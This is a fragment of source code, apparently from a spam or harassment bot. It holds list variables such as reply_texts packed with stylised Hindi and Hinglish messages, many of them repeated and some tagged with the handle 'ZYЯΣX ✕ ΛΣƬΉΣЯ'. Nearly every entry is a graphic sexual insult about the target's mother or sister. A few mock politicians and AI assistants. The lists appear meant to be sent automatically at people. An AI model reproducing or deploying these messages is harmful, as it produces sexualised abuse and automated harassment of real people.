            "𝙏𝙍𝙐𝙈𝙋 𝙎𝘼𝙄𝘿 THis 𝙄𝙎 𝘽𝙇𝙊𝙊𝘿Y 𝙈𝙊𝙏𝙃𝙀𝙍𝙁*\"𝘾𝙆𝙀𝙍",
            "𝗧𝗢𝗛𝗔𝗥 𝗠𝗨𝗠𝗠𝗬 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗠𝗘𝗜 𝗣𝗨𝗥𝗜 𝗞𝗜 𝗣𝗨𝗥𝗜 𝗞𝗜𝗡𝗚𝗙𝗜𝗦𝗛𝗘𝗥 𝗞𝗜 𝗕𝗢𝗧𝗧𝗟𝗘 𝗗𝗔𝗟 𝗞𝗘 𝗧𝗢𝗗 𝗗𝗨𝗡𝗚𝗔 𝗔𝗡𝗗𝗘𝗥 𝗛𝗜 😱😂🤩",
            "𝐓𝐄𝐑𝐈 𝐌𝐀𝐀 𝐊𝐈 𝐂𝐇𝐔𝐓 𝐌𝐄 ✋ 𝐇𝐀𝐓𝐓𝐇 𝐃𝐀𝐋𝐊𝐄 👶 𝐁𝐀𝐂𝐂𝐇𝐄 𝐍𝐈𝐊𝐀𝐋 𝐃𝐔𝐍𝐆𝐀 😍",
            "𝐓𝐄𝐑𝐀 𝐏𝐄𝐇𝐋𝐀 𝐁𝐀𝐀𝐏 𝐇𝐔 𝐌𝐀𝐃𝐀𝐑𝐂𝐇𝐎𝐃",
            "𝗧𝗘𝗥𝗜 𝗠𝗨𝗠𝗠𝗬 𝗞𝗘 𝗦𝗔𝗔𝗧𝗛 𝗟𝗨𝗗𝗢 𝗞𝗛𝗘𝗟𝗧𝗘 𝗞𝗛𝗘𝗟𝗧𝗘 𝗨𝗦𝗞𝗘 𝗠𝗨𝗛 𝗠𝗘 𝗔𝗣𝗡𝗔 𝗟𝗢𝗗𝗔 𝗗𝗘 𝗗𝗨𝗡𝗚𝗔☝🏻☝🏻😬",
            "𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗠𝗘 𝗦𝗨𝗧𝗟𝗜 𝗕𝗢𝗠𝗕 𝗙𝗢𝗗 𝗗𝗨𝗡𝗚𝗔 𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗜 𝗝𝗛𝗔𝗔𝗧𝗘 𝗝𝗔𝗟 𝗞𝗘 𝗞𝗛𝗔𝗔𝗞 𝗛𝗢 𝗝𝗔𝗬𝗘𝗚𝗜💣🔥",
            "𝐓𝐄𝐑𝐈 𝐕𝐀𝐇𝐄𝐄𝐍 𝐊𝐎 𝐀𝐏𝐍𝐄 𝐋𝐔𝐍𝐃 𝐏𝐑 𝐈𝐓𝐍𝐀 𝐉𝐇𝐔𝐋𝐀𝐀𝐔𝐍𝐆𝐀 𝐊𝐈 𝐉𝐇𝐔𝐋𝐓𝐄 𝐉𝐇𝐔𝐋𝐓𝐄 𝐇𝐈 𝐁𝐀𝐂𝐇𝐀 𝐏𝐀𝐈𝐃𝐀 𝐊𝐑 𝐃𝐄𝐆𝐈 💦💋",
            "𝐆𝐀𝐋𝐈 𝐆𝐀𝐋𝐈 𝐌𝐄 𝐑𝐄𝐇𝐓𝐀 𝐇𝐄 𝐒𝐀𝐍𝐃 𝐓𝐄𝐑𝐈 𝐌𝐀𝐀𝐊𝐎 𝐂𝐇𝐎𝐃 𝐃𝐀𝐋𝐀 𝐎𝐑 𝐁𝐀𝐍𝐀 𝐃𝐈𝐀 𝐑𝐀𝐍𝐃 🤤🤣",
            "𝐒𝐀𝐁 𝐁𝐎𝐋𝐓𝐄 𝐌𝐔𝐉𝐇𝐊𝐎 𝐏𝐀𝐏𝐀 𝐊𝐘𝐎𝐔𝐍𝐊𝐈 𝐌𝐄𝐍𝐄 𝐁𝐀𝐍𝐀𝐃𝐈𝐀 𝐓𝐄𝐑𝐈 𝐌𝐀𝐀𝐊𝐎 𝐏𝐑𝐄𝐆𝐍𝐄𝐍𝐓 🤣🤣",
            "𝙏𝙀𝙍𝙄 𝘽𝙀𝙃𝙀𝙉 𝙇𝙀𝙏𝙄 𝙈𝙀𝙍𝙄 𝙇𝙐𝙉𝘿 𝘽𝘼𝘿𝙀 𝙈𝘼𝙎𝙏𝙄 𝙎𝙀 𝙏𝙀𝙍𝙄 𝘽𝙀𝙃𝙀𝙉 𝙆𝙊 𝙈𝙀𝙉𝙀 𝘾𝙃𝙊𝘿 𝘿𝘼𝙇𝘼 𝘽𝙊𝙃𝙊𝙏 𝙎𝘼𝙎𝙏𝙀 𝙎𝙀",
            "𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗠𝗘 𝗖𝗛𝗔𝗡𝗚𝗘𝗦 𝗖𝗢𝗠𝗠𝗜𝗧 𝗞𝗥𝗨𝗚𝗔 𝗙𝗜𝗥 𝗧𝗘𝗥𝗜 𝗕𝗛𝗘𝗘𝗡 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗔𝗨𝗧𝗢𝗠𝗔𝗧𝗜𝗖𝗔𝗟𝗟𝗬 𝗨𝗣𝗗𝗔𝗧𝗘 𝗛𝗢𝗝𝗔𝗔𝗬𝗘𝗚𝗜🤖🙏🤔",
            "𝐓𝐄𝐑𝐈 𝐌𝐀𝐀𝐀𝐊𝐈 𝐂𝐇𝐔𝐃𝐀𝐈 𝐊𝐎 𝐏𝐎𝐑𝐍𝐇𝐔𝐁.𝐂𝐎𝐌 𝐏𝐄 𝐔𝐏𝐋𝐎𝐀𝐃 𝐊𝐀𝐑𝐃𝐔𝐍𝐆𝐀 𝐒𝐔𝐀𝐑 𝐊𝐄 𝐂𝐇𝐎𝐃𝐄 🤣💋💦",
            "𝐓𝐄𝐑𝐈 𝐁𝐀𝐇𝐄𝐍 𝐊𝐈 𝐆𝐀𝐀𝐍𝐃 𝐌𝐄𝐈 𝐎𝐍𝐄𝐏𝐋𝐔𝐒 𝐊𝐀 𝐖𝐑𝐀𝐏 𝐂𝐇𝐀𝐑𝐆𝐄𝐑 𝟑𝟎𝐖 𝐇𝐈𝐆𝐇 𝐏𝐎𝐖𝐄𝐑 💥😂😎",
            "𝐓𝐔𝐉𝐇𝐄 𝐀𝐁 𝐓𝐀𝐊 𝐍𝐀𝐇𝐈 𝐒𝐌𝐉𝐇 𝐀𝐘𝐀 𝐊𝐈 𝐌𝐀𝐈 𝐇𝐈 𝐇𝐔 𝐓𝐔𝐉𝐇𝐄 𝐏𝐀𝐈𝐃𝐀 𝐊𝐀𝐑𝐍𝐄 𝐖𝐀𝐋𝐀 𝐁𝐇𝐎𝐒𝐃𝐈𝐊𝐄𝐄 𝐀𝐏𝐍𝐈 𝐌𝐀𝐀 𝐒𝐄 𝐏𝐔𝐂𝐇 𝐑𝐀𝐍𝐃𝐈 𝐊𝐄 𝐁𝐀𝐂𝐇𝐄𝐄𝐄𝐄 🤩👊👤😍",
            "𝐓𝐄𝐑𝐈 𝐁𝐀𝐇𝐄𝐍 𝐊𝐈 𝐂𝐇𝐔𝐓 𝐌𝐄𝐈 𝐀𝐏𝐏𝐋𝐄 𝐊𝐀 𝟏𝟖𝐖 𝐖𝐀𝐋𝐀 𝐂𝐇𝐀𝐑𝐆𝐄𝐑 🔥🤩",
            "𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗢 𝗜𝗧𝗡𝗔 𝗖𝗛𝗢𝗗𝗨𝗡𝗚𝗔 𝗞𝗜 𝗦𝗔𝗣𝗡𝗘 𝗠𝗘𝗜 𝗕𝗛𝗜 𝗠𝗘𝗥𝗜 𝗖𝗛𝗨𝗗𝗔𝗜 𝗬𝗔𝗔𝗗 𝗞𝗔𝗥𝗘𝗚𝗜 𝗥Æ𝗡𝗗𝗜 🥳😍👊💥",
            "𝙋𝘼𝙋𝘼 𝙆𝙄 𝙎𝙋𝙀𝙀𝘿 𝙈𝙏𝘾𝙃 𝙉𝙃𝙄 𝙃𝙊 𝙍𝙃𝙄 𝙆𝙔𝘼",
            "𝙆𝙄𝙏𝙉𝙄 𝘾𝙃𝙊𝘿𝙐 𝙏𝙀𝙍𝙄 𝙈𝘼 𝘼𝘽 𝙊𝙍..",
            "𝗧𝗘𝗥𝗜 𝗠𝗔𝗨𝗦𝗜 𝗞𝗘 𝗕𝗛𝗢𝗦𝗗𝗘 𝗠𝗘𝗜 𝗜𝗡𝗗𝗜𝗔𝗡 𝗥𝗔𝗜𝗟𝗪𝗔𝗬 🚂💥😂",
            "𝙆𝙄𝙏𝙉𝙄 𝙂𝙇𝙄𝙔𝘼 𝙋𝘿𝙒𝙀𝙂𝘼 𝘼𝙋𝙉𝙄 𝙈𝘼 𝙆𝙊",
            "𝗧𝗘𝗥𝗜 𝗜𝗧𝗘𝗠 𝗞𝗜 𝗚𝗔𝗔𝗡𝗗 𝗠𝗘 𝗟𝗨𝗡𝗗 𝗗𝗔𝗔𝗟𝗞𝗘,𝗧𝗘𝗥𝗘 𝗝𝗔𝗜𝗦𝗔 𝗘𝗞 𝗢𝗥 𝗡𝗜𝗞𝗔𝗔𝗟 𝗗𝗨𝗡𝗚𝗔 𝗠𝗔‌𝗔‌𝗗𝗔𝗥𝗖𝗛Ø𝗗🤘🏻🙌🏻☠️",
            "2 𝙍𝙐𝙋𝘼𝙔 𝙆𝙄 𝙋𝙀𝙋𝙎𝙄 𝙏𝙀𝙍𝙄 𝙈𝙐𝙈𝙈𝙔 𝙎𝘼𝘽𝙎𝙀 𝙎𝙀𝙓𝙔 💋💦",
            "𝐓ᴇʀɪ 𝐌ᴜᴍᴍʏ 𝐂ʜᴏᴅ 𝐃ɪ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  𝐍ᴇ 𝐁ᴡᴀʜᴀʜᴀʜᴀ ⚜"
        ]

        reply_texts = [
            "⋆｡ﾟ☁︎｡𝐂ʏᴜ 𝐑ᴇ मदरचोद  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के सामने 𝐅ʏᴛᴇʀ 𝐁ᴀɴᴇɢᴀ ⋆𓂃 ོ☼𓂃 😂🔥",
            "नहीं नहीं तेरी मां को 𝐒ɪʀғ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप चोद सकता है ִֶָ𓂃 ࣪ ִֶָ👑་༘࿐ sᴀᴍᴊʜᴀ ʀᴀɴᴅɪᴋᴇ ???",
            "तेरी मां का 𝐒ᴛʏʟɪsʜ भोसड़ा 😱",
            "𝑻𝒆𝒓𝒚 𝒎𝒂𝒂 𝒓𝒂𝒏𝒅𝒂𝒍 𝒉 𝒃𝒂𝒔 𝒃𝒂𝒂𝒕 𝒌𝒉𝒂𝒕𝒂𝒎 😡🔥",
            "सोच तेरी बहन को  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप का गुलाम चोद रहा 😎🔥",
            "Hello hello?? SAAS aarahi है? रण्डी पुत्र 🧘🏻",
            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\\~ 👑 बाप से सही chudi 🥵🔥",
            "ᴛᴜ ᴏʀ ᴛᴇʀɪ ᴍᴀᴀ ᴅᴏɴᴏ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के ʟɴᴅ sᴇ ᴋᴀʙʜɪ ᴜᴛʜ ɴʜɪ ᴘᴀʏᴇ 😂🔥",
            "🇮🇳𝐵𝐻𝐴𝑅𝐴𝑇 𝐻𝐴𝑀𝐴𝑅𝐴 𝐷𝐸𝑆𝐻 𝐻 𝐴𝑈𝑅 𝑈𝑆 𝐷𝐸𝑆𝐻 𝑀𝐸 तेरी मां घर घर जाके SHAMBHOG करती है ! 🛐",
            "⋆｡ﾟ☁︎｡𝐂ʏᴜ 𝐑ᴇ मदरचोद  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के सामने 𝐅ʏᴛᴇʀ 𝐁ᴀɴᴇɢᴀ ⋆𓂃 ོ☼𓂃 😂🔥",
            "नहीं नहीं तेरी मां को 𝐒ɪʀғ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप चोद सकता है ִֶָ𓂃 ࣪ ִֶָ👑་༘࿐ sᴀᴍᴊʜᴀ ʀᴀɴᴅɪᴋᴇ ???",
            "तेरी मां का 𝐒ᴛʏʟɪsʜ भोसड़ा 😱",
            "𝑻𝒆𝒓𝒚 𝒎𝒂𝒂 𝒓𝒂𝒏𝒅𝒂𝒍 𝒉 𝒃𝒂𝒔 𝒃𝒂𝒂𝒕 𝒌𝒉𝒂𝒕𝒂𝒎 😡🔥",
            "सोच तेरी बहन को  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप का गुलाम चोद रहा 😎🔥",
            "Hello hello?? saas aarahi है? रण्डी पुत्र 🧘🏻",
            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\\~ 👑 बाप से सही chudi 🥵🔥",
            "ᴛᴜ ᴏʀ ᴛᴇʀɪ ᴍᴀᴀ ᴅᴏɴᴏ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के ʟɴᴅ sᴇ ᴋᴀʙʜɪ ᴜᴛʜ ɴʜɪ ᴘᴀʏᴇ 😂🔥",
            "🇮🇳𝐵𝐻𝐴𝑅𝐴𝑇 𝐻𝐴𝑀𝐴𝑅𝐴 𝐷𝐸𝑆𝐻 𝐻 𝐴𝑈𝑅 𝑈𝑆 𝐷𝐸𝑆𝐻 𝑀𝐸 तेरी मां घर घर जाके SAMBHOG करती है ! 🛐",
            "⋆｡ﾟ☁︎｡𝐂ʏᴜ 𝐑ᴇ मदरचोद  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के सामने 𝐅ʏᴛᴇʀ 𝐁ᴀɴᴇɢᴀ ⋆𓂃 ོ☼𓂃 😂🔥",
            "नहीं नहीं तेरी मां को 𝐒ɪʀғ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप चोद सकता है ִֶָ𓂃 ࣪ ִֶָ👑་༘࿐ sᴀᴍᴊʜᴀ ʀᴀɴᴅɪᴋᴇ ???",
            "तेरी मां का 𝐒ᴛʏʟɪsʜ भोसड़ा 😱",
            "𝑻𝒆𝒓𝒚 𝒎𝒂𝒂 𝒓𝒂𝒏𝒅𝒂𝒍 𝒉 𝒃𝒂𝒔 𝒃𝒂𝒂𝒕 𝒌𝒉𝒂𝒕𝒂𝒎 😡🔥",
            "सोच तेरी बहन को  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप का गुलाम चोद रहा 😎🔥",
            "Hello hello?? SAAS aarahi है? रण्डी पुत्र 🧘🏻",
            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\\~ 👑 बाप से सही chudi 🥵🔥",
            "ᴛᴜ ᴏʀ ᴛᴇʀɪ ᴍᴀᴀ ᴅᴏɴᴏ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के ʟɴᴅ sᴇ ᴋᴀʙʜɪ ᴜᴛʜ ɴʜɪ ᴘᴀʏᴇ 😂🔥",
            "🇮🇳𝐵𝐻𝐴𝑅𝐴𝑇 𝐻𝐴𝑀𝐴𝑅𝐴 𝐷𝐸𝑆𝐻 𝐻 𝐴𝑈𝑅 𝑈𝑆 𝐷𝐸𝑆𝐻 𝑀𝐸 तेरी मां घर घर जाके SAMBHOG करती है ! 🛐",
            "⋆｡ﾟ☁︎｡𝐂ʏᴜ 𝐑ᴇ मदरचोद  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के सामने 𝐅ʏᴛᴇʀ 𝐁ᴀɴᴇɢᴀ ⋆𓂃 ོ☼𓂃 😂🔥",
            "नहीं नहीं तेरी मां को 𝐒ɪʀғ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप चोद सकता है ִֶָ𓂃 ࣪ ִֶָ👑་༘࿐ sᴀᴍᴊʜᴀ ʀᴀɴᴅɪᴋᴇ ???",
            "तेरी मां का 𝐒ᴛʏʟɪsʜ भोसड़ा 😱",
            "𝑻𝒆𝒓𝒚 𝒎𝒂𝒂 𝒓𝒂𝒏𝒅𝒂𝒍 𝒉 𝒃𝒂𝒔 𝒃𝒂𝒂𝒕 𝒌𝒉𝒂𝒕𝒂𝒎 😡🔥",
            "सोच तेरी बहन को  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप का गुलाम चोद रहा 😎🔥",
            "Hello hello?? SAAS aarahi है? रण्डी पुत्र 🧘🏻",
            "Shut up रंडीके वरना दुनिया यही बोलेगी तेरी बहन  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  /\\~ 👑 बाप से सही chudi 🥵🔥",
            "ᴛᴜ ᴏʀ ᴛᴇʀɪ ᴍᴀᴀ ᴅᴏɴᴏ  ⚡️ZYЯΣX ✕ ΛΣƬΉΣЯ⚡️  बाप के ʟɴᴅ sᴇ ᴋᴀʙʜɪ ᴜᴛʜ ɴʜɪ ᴘᴀʏᴇ 😂🔥",
            "𝙃𝙀𝙔 𝙂𝙊𝙊𝙂𝙇𝙀 𝙁𝙐𝘾𝙆 𝙃𝙄𝙎 𝙈𝙊𝙈 𝙋𝙍𝙊𝙋𝙀𝙍𝙇𝙔",
            "𝙃𝙀𝙔 𝙂𝙊𝙊𝙂𝙇𝙀 𝘼𝙎𝙆 𝙃𝙄𝙈 𝙏𝙊 𝘾𝙊𝙑𝙀𝙍 𝙃𝙄𝙎 𝙈𝙊𝙈'𝙎 𝘼𝙎𝙎",
            "𝙃𝙀𝙔 𝙂𝙊𝙊𝙂𝙇𝙀 𝙁𝙄𝙓 𝙈𝙔 𝘼‌𝙋𝙋𝙊𝙄𝙉𝙏𝙈𝙀𝙉𝙏 𝙒𝙄𝙏𝙃 𝙃𝙄𝙎 𝙎𝙄𝙎",
            "𝙃𝙀𝙔 𝙂𝙊𝙊𝙂𝙇𝙀 𝙁𝙐𝘾𝙆 𝘼𝙉𝘿 𝙏𝙃𝙍𝙊𝙒 𝙏𝙃𝙄𝙎 𝙂𝘼𝙍𝙀𝙀𝘽 𝙎𝙊𝙉",
            "𝙃𝙀𝙔 𝙂𝙊𝙊𝙂𝙇𝙀 𝘿𝙊 𝙉𝙊𝙏 𝙎𝙏𝙊𝙋 𝙁𝙐𝘾𝙆𝙄𝙉𝙂 𝙈𝙔 𝙂𝙐𝙇𝘼‌𝙈",
            "𝙂𝙀𝙈𝙄𝙉𝙄 𝙎𝘼𝙄𝘿  𝙄𝙎 𝙍𝙉𝘿𝙔 𝙋𝙐𝙏𝙍𝘼",
            "𝙋𝙀𝙍𝙋𝙇𝙀𝙓𝙄𝙏𝙔 𝙎𝘼𝙄𝘿 This 𝙄𝙎 𝙂𝙐𝙇𝘼𝙈",
            "𝙂𝙍𝙊𝙆 𝘼𝙄 𝙎𝘼𝙄𝘿 𝙄𝙎 𝙂𝘼𝙍𝙀𝙀𝘽",
            "𝘽𝙊𝙏 𝙎𝘼‌𝙄𝘿  𝙄𝙎 𝘾𝙃𝙐𝘿𝘼𝙆𝘼𝘿",
            "𝙈𝙊𝘿𝙄 𝙎𝘼‌𝙄𝘿  𝙄𝙎 𝙋𝙊𝙇𝙀 𝘿𝘼𝙉𝘾𝙀𝙍",
            "𝙏𝙍𝙐𝙈𝙋 𝙎𝘼𝙄𝘿 THis 𝙄𝙎 𝘽𝙇𝙊𝙊𝘿Y 𝙈𝙊𝙏𝙃𝙀𝙍𝙁*\"𝘾𝙆𝙀𝙍",
            "𝗧𝗢𝗛𝗔𝗥 𝗠𝗨𝗠𝗠𝗬 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗠𝗘𝗜 𝗣𝗨𝗥𝗜 𝗞𝗜 𝗣𝗨𝗥𝗜 𝗞𝗜𝗡𝗚𝗙𝗜𝗦𝗛𝗘𝗥 𝗞𝗜 𝗕𝗢𝗧𝗧𝗟𝗘 𝗗𝗔𝗟 𝗞𝗘 𝗧𝗢𝗗 𝗗𝗨𝗡𝗚𝗔 𝗔𝗡𝗗𝗘𝗥 𝗛𝗜 😱😂🤩",
            "𝐓𝐄𝐑𝐈 𝐌𝐀𝐀 𝐊𝐈 𝐂𝐇𝐔𝐓 𝐌𝐄 ✋ 𝐇𝐀𝐓𝐓𝐇 𝐃𝐀𝐋𝐊𝐄 👶 𝐁𝐀𝐂𝐂𝐇𝐄 𝐍𝐈𝐊𝐀𝐋 𝐃𝐔𝐍𝐆𝐀 😍",
            "𝐓𝐄𝐑𝐀 𝐏𝐄𝐇𝐋𝐀 𝐁𝐀𝐀𝐏 𝐇𝐔 𝐌𝐀𝐃𝐀𝐑𝐂𝐇𝐎𝐃",
            "𝗧𝗘𝗥𝗜 𝗠𝗨𝗠𝗠𝗬 𝗞𝗘 𝗦𝗔𝗔𝗧𝗛 𝗟𝗨𝗗𝗢 𝗞𝗛𝗘𝗟𝗧𝗘 𝗞𝗛𝗘𝗟𝗧𝗘 𝗨𝗦𝗞𝗘 𝗠𝗨𝗛 𝗠𝗘 𝗔𝗣𝗡𝗔 𝗟𝗢𝗗𝗔 𝗗𝗘 𝗗𝗨𝗡𝗚𝗔☝🏻☝🏻😬",
            "𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗠𝗘 𝗦𝗨𝗧𝗟𝗜 𝗕𝗢𝗠𝗕 𝗙𝗢𝗗 𝗗𝗨𝗡𝗚𝗔 𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗜 𝗝𝗛𝗔𝗔𝗧𝗘 𝗝𝗔𝗟 𝗞𝗘 𝗞𝗛𝗔𝗔𝗞 𝗛𝗢 𝗝𝗔𝗬𝗘𝗚𝗜💣🔥",
            "𝐓𝐄𝐑𝐈 𝐕𝐀𝐇𝐄𝐄𝐍 𝐊𝐎 𝐀𝐏𝐍𝐄 𝐋𝐔𝐍𝐃 𝐏𝐑 𝐈𝐓𝐍𝐀 𝐉𝐇𝐔𝐋𝐀𝐀𝐔𝐍𝐆𝐀 𝐊𝐈 𝐉𝐇𝐔𝐋𝐓𝐄 𝐉𝐇𝐔𝐋𝐓𝐄 𝐇𝐈 𝐁𝐀𝐂𝐇𝐀 𝐏𝐀𝐈𝐃𝐀 𝐊𝐑 𝐃𝐄𝐆𝐈 💦💋",
            "𝐆𝐀𝐋𝐈 𝐆𝐀𝐋𝐈 𝐌𝐄 𝐑𝐄𝐇𝐓𝐀 𝐇𝐄 𝐒𝐀𝐍𝐃 𝐓𝐄𝐑𝐈 𝐌𝐀𝐀𝐊𝐎 𝐂𝐇𝐎𝐃 𝐃𝐀𝐋𝐀 𝐎𝐑 𝐁𝐀𝐍𝐀 𝐃𝐈𝐀 𝐑𝐀𝐍𝐃 🤤🤣",
            "𝐒𝐀𝐁 𝐁𝐎𝐋𝐓𝐄 𝐌𝐔𝐉𝐇𝐊𝐎 𝐏𝐀𝐏𝐀 𝐊𝐘𝐎𝐔𝐍𝐊𝐈 𝐌𝐄𝐍𝐄 𝐁𝐀𝐍𝐀𝐃𝐈𝐀 𝐓𝐄𝐑𝐈 𝐌𝐀𝐀𝐊𝐎 𝐏𝐑𝐄𝐆𝐍𝐄𝐍𝐓 🤣🤣",
            "𝙏𝙀𝙍𝙄 𝘽𝙀𝙃𝙀𝙉 𝙇𝙀𝙏𝙄 𝙈𝙀𝙍𝙄 𝙇𝙐𝙉𝘿 𝘽𝘼𝘿𝙀 𝙈𝘼𝙎𝙏𝙄 𝙎𝙀 𝙏𝙀𝙍𝙄 𝘽𝙀𝙃𝙀𝙉 𝙆𝙊 𝙈𝙀𝙉𝙀 𝘾𝙃𝙊𝘿 𝘿𝘼𝙇𝘼 𝘽𝙊𝙃𝙊𝙏 𝙎𝘼𝙎𝙏𝙀 𝙎𝙀",
            "𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗠𝗘 𝗖𝗛𝗔𝗡𝗚𝗘𝗦 𝗖𝗢𝗠𝗠𝗜𝗧 𝗞𝗥𝗨𝗚𝗔 𝗙𝗜𝗥 𝗧𝗘𝗥𝗜 𝗕𝗛𝗘𝗘𝗡 𝗞𝗜 𝗖𝗛𝗨𝗨‌𝗧 𝗔𝗨𝗧𝗢𝗠𝗔𝗧𝗜𝗖𝗔𝗟𝗟𝗬 𝗨𝗣𝗗𝗔𝗧𝗘 𝗛𝗢𝗝𝗔𝗔𝗬𝗘𝗚𝗜🤖🙏🤔",
            "𝐓𝐄𝐑𝐈 𝐌𝐀𝐀𝐀𝐊𝐈 𝐂𝐇𝐔𝐃𝐀𝐈 𝐊𝐎 𝐏𝐎𝐑𝐍𝐇𝐔𝐁.𝐂𝐎𝐌 𝐏𝐄 𝐔𝐏𝐋𝐎𝐀𝐃 𝐊𝐀𝐑𝐃𝐔𝐍𝐆𝐀 𝐒𝐔𝐀𝐑 𝐊𝐄 𝐂𝐇𝐎𝐃𝐄 🤣💋💦",
            "𝐓𝐄𝐑𝐈 𝐁𝐀𝐇𝐄𝐍 𝐊𝐈 𝐆𝐀𝐀𝐍𝐃 𝐌𝐄𝐈 𝐎𝐍𝐄𝐏𝐋𝐔𝐒 𝐊𝐀 𝐖𝐑𝐀𝐏 𝐂𝐇𝐀𝐑𝐆𝐄𝐑 𝟑𝟎𝐖 𝐇𝐈𝐆𝐇 𝐏𝐎𝐖𝐄𝐑 💥😂😎",
            "𝐓𝐔𝐉𝐇𝐄 𝐀𝐁 𝐓𝐀𝐊 𝐍𝐀𝐇𝐈 𝐒𝐌𝐉𝐇 𝐀𝐘𝐀 𝐊𝐈 𝐌𝐀𝐈 𝐇𝐈 𝐇𝐔 𝐓𝐔𝐉𝐇𝐄 𝐏𝐀𝐈𝐃𝐀 𝐊𝐀𝐑𝐍𝐄 𝐖𝐀𝐋𝐀 𝐁𝐇𝐎𝐒𝐃𝐈𝐊𝐄𝐄 𝐀𝐏𝐍𝐈 𝐌𝐀𝐀 𝐒𝐄 𝐏𝐔𝐂𝐇 𝐑𝐀𝐍𝐃𝐈 𝐊𝐄 𝐁𝐀𝐂𝐇𝐄𝐄𝐄𝐄 🤩👊👤😍",
            "𝐓𝐄𝐑𝐈 𝐁𝐀𝐇𝐄𝐍 𝐊𝐈 𝐂𝐇𝐔𝐓 𝐌𝐄𝐈 𝐀𝐏𝐏𝐋𝐄 𝐊𝐀 𝟏𝟖𝐖 𝐖𝐀𝐋𝐀 𝐂𝐇𝐀𝐑𝐆𝐄𝐑 🔥🤩",
            "𝗧𝗘𝗥𝗜 𝗠𝗔‌𝗔‌ 𝗞𝗢 𝗜𝗧𝗡𝗔 𝗖𝗛𝗢𝗗𝗨𝗡𝗚𝗔 𝗞𝗜 𝗦𝗔𝗣𝗡𝗘 𝗠𝗘𝗜 𝗕𝗛𝗜 𝗠𝗘𝗥𝗜 𝗖𝗛𝗨𝗗𝗔𝗜 𝗬𝗔𝗔𝗗 𝗞𝗔𝗥𝗘𝗚𝗜 𝗥Æ𝗡𝗗𝗜 🥳😍👊💥",
            "𝙋𝘼𝙋𝘼 𝙆𝙄 𝙎𝙋𝙀𝙀𝘿 𝙈𝙏𝘾𝙃 𝙉𝙃𝙄 𝙃𝙊 𝙍𝙃𝙄 𝙆𝙔𝘼",
            "𝙆𝙄𝙏𝙉𝙄 𝘾𝙃𝙊𝘿𝙐 𝙏𝙀𝙍𝙄 𝙈𝘼 𝘼𝘽 𝙊𝙍..",
            "𝗧𝗘𝗥𝗜 𝗠𝗔𝗨𝗦𝗜 𝗞𝗘 𝗕𝗛𝗢𝗦𝗗𝗘 𝗠𝗘𝗜 𝗜𝗡𝗗𝗜𝗔𝗡 𝗥𝗔𝗜𝗟𝗪𝗔𝗬 🚂💥😂",
            "𝙆𝙄𝙏𝙉𝙄 𝙂𝙇𝙄𝙔𝘼 𝙋𝘿𝙒𝙀𝙂𝘼 𝘼𝙋𝙉𝙄 𝙈𝘼 𝙆𝙊",
            "𝗧𝗘𝗥𝗜 𝗜𝗧𝗘𝗠 𝗞𝗜 𝗚𝗔𝗔𝗡𝗗 𝗠𝗘 𝗟𝗨𝗡𝗗 𝗗𝗔𝗔𝗟𝗞𝗘,𝗧𝗘𝗥𝗘 𝗝𝗔𝗜𝗦𝗔 𝗘𝗞 𝗢𝗥 𝗡𝗜𝗞𝗔𝗔𝗟 𝗗𝗨𝗡𝗚𝗔 𝗠𝗔‌𝗔‌𝗗𝗔𝗥𝗖𝗛Ø𝗗🤘🏻🙌🏻☠️",
            "2 𝙍𝙐𝙋𝘼𝙔 𝙆𝙄 𝙋𝙀𝙋𝙎𝙄 𝙏𝙀𝙍𝙄 𝙈𝙐𝙈𝙈𝙔 𝙎𝘼𝘽𝙎𝙀 𝙎𝙀𝙓𝙔 💋💦",
            "🇮🇳𝐵𝐻𝐴𝑅𝐴𝑇 𝐻𝐴𝑀𝐴𝑅𝐴 𝐷𝐸𝑆𝐻 𝐻 𝐴𝑈𝑅 𝑈𝑆 𝐷𝐸𝑆𝐻 𝑀𝐸 तेरी मां घर घर जाके SAMBHOG करती है ! 🛐"
        ]

        fun_texts = [
